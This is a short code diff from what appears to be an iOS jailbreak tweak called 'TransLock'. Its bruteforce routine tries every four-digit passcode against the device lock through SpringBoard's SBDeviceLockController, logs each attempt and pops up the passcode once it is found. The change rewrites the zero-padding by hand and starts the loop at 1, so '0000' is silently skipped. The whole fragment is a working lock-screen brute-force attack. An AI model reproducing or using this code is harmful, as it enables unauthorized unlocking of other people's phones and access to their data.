@@ -28,9 +28,33 @@ NSString *numString;
 }
 
 - (void)bruteforce {
-	for (int i = 0; i <= 9999; i++)
+	NSString *oneZeroString = @"0";
+	NSString *twoZeroString = @"00";
+	NSString *threeZeroString = @"000";
+		
+	for (int i = 1; i <= 9999; i++)
 	{
-		numString = [NSString stringWithFormat:@"%04d", i];
+		numString = [NSString stringWithFormat:@"%d", i];
+		switch ([numString length])
+		{
+			case 1:
+				{
+					numString = [threeZeroString stringByAppendingString:numString];
+					break;
+				}
+			case 2:
+				{
+					numString = [twoZeroString stringByAppendingString:numString];
+					break;
+				}
+			case 3:
+				{
+					numString = [oneZeroString stringByAppendingString:numString];
+					break;
+				}
+			default:
+				break;
+		}
 		NSLog(@"Testing : %@", numString);
 		if ([[%c(SBDeviceLockController) sharedController] attemptDeviceUnlockWithPassword:numString appRequested:NO]) {
 			[[[UIAlertView alloc] initWithTitle:@"TransLock" message:[NSString stringWithFormat:@"Password is %@", numString] delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil] show];
